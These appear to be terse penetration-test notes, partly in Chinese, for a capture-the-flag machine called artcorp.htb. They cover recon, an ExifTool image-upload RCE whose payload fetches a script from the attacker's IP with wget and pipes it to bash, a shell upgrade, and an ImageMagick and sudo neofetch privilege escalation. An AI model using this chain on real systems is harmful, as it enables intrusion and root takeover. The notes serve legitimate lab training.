@@ -1,0 +1,39 @@
+nmap -sV -sC -Pn 10.10.11.140 > nmap.txt
+根據nmap掃描出來的結果，查找到artcorp.htb 
+綁定host
+gobuster dir  -u http://artcorp.htb/ -w /Users/timmy/Tools/SecLists/Discovery/Web-Content/common.txt > gobuster.txt
+ffuf -w /Users/timmy/Tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://artcorp.htb -H "Host: FUZZ.artcorp.htb" -mc all -fw 1
+使用ffuf，找到dev0
+
+1，綁定host，查看到頁面可以上傳圖檔
+gobuster dir  -u http://dev01.artcorp.htb/metaview -w /Users/timmy/Tools/SecLists/Discovery/Web-Content//quickhits.txt > gobusterdev.txt
+搜索之後發現有composer.json文件
+根據ExifToolWrapper上網搜索exploit 
+
+https://github.com/OneSecCyber/JPEG_RCE
+exiftool -config eval.config runme.jpg -eval='system("wget -O - http://10.10.16.15/reverse.txt|bash")'
+exiftool -config eval.config runme.jpg -eval='system("ls -la")'
+
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm
+ctrl+z
+stty raw -echo && fg
+enter
+stty rows 44 && stty columns 85 && export TERM=xterm
+export TERM=xterm
+
+
+https://github.com/DominicBreuker/pspy
+執行pspy64s 可以發現定時任務執行convert_images.sh
+/bin/bash /usr/local/bin/convert_images.sh
+根據mogrify 找到對應的漏洞利用文章
+https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html
+
+
+
+
+env_keep+=XDG_CONFIG_HOME
+
+export XDG_CONFIG_HOME=/home/thomas/.config
+sudo /usr/bin/neofetch \"\"
